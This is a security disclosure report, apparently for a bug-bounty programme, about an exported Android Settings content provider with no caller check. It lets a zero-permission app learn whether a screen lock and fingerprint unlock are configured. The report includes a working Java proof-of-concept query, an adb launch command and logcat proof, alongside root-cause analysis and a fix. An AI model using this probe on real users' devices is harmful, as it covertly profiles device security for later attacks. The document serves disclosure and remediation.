# com.android.settings — `SuggestionStateProvider` Leaks Device Security-Posture Signals (Screen Lock / Biometric Enrollment Status) to Any Zero-Permission App

## Summary

`com.android.settings.dashboard.suggestions.SuggestionStateProvider` (authority `com.android.settings.suggestions.status`) is an exported `ContentProvider` with **no manifest permission and no caller-identity check of any kind** in its `call()` implementation — unlike every other custom `ContentProvider` in this app (`RingerModeProvider`, `FeatureAvailabilityProvider`, `AccessibilityAppearanceProvider` all at minimum check `getCallingPackage()` against an allowlist; this one checks nothing at all).

A zero-permission app can call it with an arbitrary `ComponentName` naming any of Settings' "dashboard suggestion" tiles and learn whether that suggestion has been completed/dismissed — including `ScreenLockSuggestionActivity` (**is a screen lock configured at all?**) and `FingerprintSuggestionActivity`/`FingerprintEnrollSuggestionActivity` (**is biometric unlock enrolled?**).

## Severity: MEDIUM

- **Attack vector**: Local (malicious app installed on device)
- **Permissions required**: ZERO
- **User interaction**: None
- **CIA impact**: Confidentiality — a zero-permission app can determine the device's security posture (whether a screen lock / biometric is configured), silently and repeatably, with no consent and no trace visible to the user. This is reconnaissance information with real value to an attacker: a device confirmed to have **no screen lock configured** is a materially easier target for any subsequent physical-access or local-privilege-escalation attack, and this signal can be checked by a dormant, already-installed zero-permission app at any time (e.g., immediately before attempting some other attack, or reported back to a C2 server to prioritize which infected devices are worth pursuing further).

## Affected Component

- **Package**: `com.android.settings` (`SettingsGoogle.apk`), versionCode 37
- **Provider**: `com.android.settings.dashboard.suggestions.SuggestionStateProvider`, authority `com.android.settings.suggestions.status`

```
provider android:name="com.android.settings.dashboard.suggestions.SuggestionStateProvider"
  android:exported=true
  (no permission, no readPermission, no writePermission)
```

## Root Cause

```java
public class SuggestionStateProvider extends ContentProvider {
    static final String EXTRA_CANDIDATE_ID = "candidate_id";
    static final String METHOD_GET_SUGGESTION_STATE = "getSuggestionState";

    @Override
    public Bundle call(String str, String str2, Bundle bundle) {
        Bundle bundle2 = new Bundle();
        if (METHOD_GET_SUGGESTION_STATE.equals(str)) {
            String string = bundle.getString(EXTRA_CANDIDATE_ID);
            ComponentName componentName = (ComponentName) bundle.getParcelable("android.intent.extra.COMPONENT_NAME");
            boolean zIsSuggestionComplete = componentName == null
                ? true
                : FeatureFactory.getFeatureFactory().getSuggestionFeatureProvider().isSuggestionComplete(getContext(), componentName);
            bundle2.putBoolean("candidate_is_complete", zIsSuggestionComplete);
        }
        return bundle2;
    }
}
```

**No `getCallingPackage()` check, no permission check, nothing** — every other custom provider in this exact app has at least a package-name allowlist check in the equivalent spot (e.g. `RingerModeProvider`, `FeatureAvailabilityProvider`, `AccessibilityAppearanceProvider` all call `getCallingPackage()` first and reject unknown callers). This one was simply missed.

`isSuggestionComplete()` (`SuggestionFeatureProviderImpl.java`) dispatches on the class name of the supplied `ComponentName` and returns the real completion state for a range of security- and privacy-relevant "dashboard suggestion" tiles, including:

```java
if (className.equals(ScreenLockSuggestionActivity.class.getName())) {
    return ScreenLockSuggestionActivity.isSuggestionComplete(context);   // has the user set a PIN/pattern/password?
}
// ... FingerprintSuggestionActivity, FingerprintEnrollSuggestionActivity, WifiCallingSuggestionActivity, etc.
```

- **Tested on**: Pixel 6a, Android 17 Beta (API 37), September 2026

## Proof of Concept

### Attacker App (`com.vrp.zeroperm`)

Holds **zero** Android permissions. Calls the provider directly via the standard `ContentResolver.call()` API with an arbitrary `ComponentName`:

```java
Bundle extras = new Bundle();
extras.putString("candidate_id", "com.android.settings.password.ScreenLockSuggestionActivity");
extras.putParcelable("android.intent.extra.COMPONENT_NAME",
        new ComponentName("com.android.settings", "com.android.settings.password.ScreenLockSuggestionActivity"));
Bundle result = getContentResolver().call(
        Uri.parse("content://com.android.settings.suggestions.status"),
        "getSuggestionState", null, extras);
boolean hasScreenLock = result.getBoolean("candidate_is_complete", false);
```

Full source: `SuggestionStateLeakActivity.java` (attached).

### Reproduction Steps

1. Install the PoC APK (`poc.apk`) — holds **zero** Android permissions.
2. Launch it:
   ```
   adb shell am start -n com.vrp.zeroperm/.SuggestionStateLeakActivity
   ```

### Runtime Proof (logcat)

```
W SUGGESTION_STATE_LEAK: === SuggestionStateProvider zero-permission probe ===
W SUGGESTION_STATE_LEAK: UID=10397 (ZERO permissions)
W SUGGESTION_STATE_LEAK: [LEAKED] com.android.settings.password.ScreenLockSuggestionActivity -> candidate_is_complete=true
W SUGGESTION_STATE_LEAK: [LEAKED] com.android.settings.biometrics.fingerprint.FingerprintSuggestionActivity -> candidate_is_complete=true
W SUGGESTION_STATE_LEAK: [LEAKED] com.android.settings.biometrics.fingerprint.FingerprintEnrollSuggestionActivity -> candidate_is_complete=false
W SUGGESTION_STATE_LEAK: [LEAKED] com.android.settings.wifi.calling.WifiCallingSuggestionActivity -> candidate_is_complete=true
```

Every query succeeded, no `SecurityException`, no permission of any kind held by the caller. On this test device (which has a real password and fingerprint configured, as established earlier in this same research session), the leaked values correctly reflect ground truth — this is a genuine, working information leak, not a benign default.

## Impact

### Confidentiality
- A zero-permission app can determine, with certainty and with no user awareness, whether the device currently has **any screen lock configured**, and whether **biometric unlock is enrolled** — this is device-security-posture information Android does not otherwise expose to third-party apps without a permission.
- This can be checked silently and repeatedly (e.g., polled periodically, or checked once and exfiltrated), and combined with other reconnaissance an attacker app performs to build a profile of how well-protected a given infected device is.
- The same code path is reachable for every other "dashboard suggestion" tile in Settings (wallpaper/style suggestions, WiFi calling, Night Display, etc. per `SuggestionFeatureProviderImpl`), most of which are lower-sensitivity, but the *security-relevant* ones (screen lock, biometric enrollment) are the concerning subset.

## Recommended Fix

Add the same `getCallingPackage()` allowlist check already used by every sibling provider in this app (`RingerModeProvider`, `FeatureAvailabilityProvider`, `AccessibilityAppearanceProvider`) to `SuggestionStateProvider.call()`, restricting it to the legitimate internal callers (e.g. `com.android.settings` itself / the Settings Intelligence app) that actually need this state for rendering the dashboard suggestion list.

## Files Attached

- `poc.apk` — Zero-permission PoC app
- `SuggestionStateLeakActivity.java` — PoC source
- `logcat_proof.txt` — Runtime proof log
